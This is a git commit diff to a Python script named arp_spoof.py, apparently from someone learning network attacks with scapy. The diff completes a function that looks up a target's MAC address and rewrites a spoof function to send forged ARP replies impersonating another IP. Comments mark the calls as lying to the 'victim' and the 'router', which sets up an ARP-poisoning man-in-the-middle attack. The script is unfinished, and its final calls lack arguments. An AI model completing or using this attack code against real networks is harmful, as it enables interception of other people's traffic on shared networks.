57b6677a8aab55c0e4623e5512708acdf9de07a9
Rose Orth <rosaliejorth@gmail.com>
2020-01-22 22:06:44 +0100

    none

--- arp_spoof.py
+++ arp_spoof.py
@@ -8,15 +8,16 @@ def get_mac(ip):
 	arp_req_broadcast = broadcast/arp_req
 	answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
 
-	answered_list[0][1].hwsrc
-	clients_list = []
+	return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
-	packet = scapy.ARP(op=2, pdst=target_ip, hwdst="")
+	target_mac = get_mac(target_ip)
+	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 	scapy.send(packet)
 
-get_mac("")	
+spoof() #lie to victim
+spoof() #lie to router
 
 
 #psrc = ip address
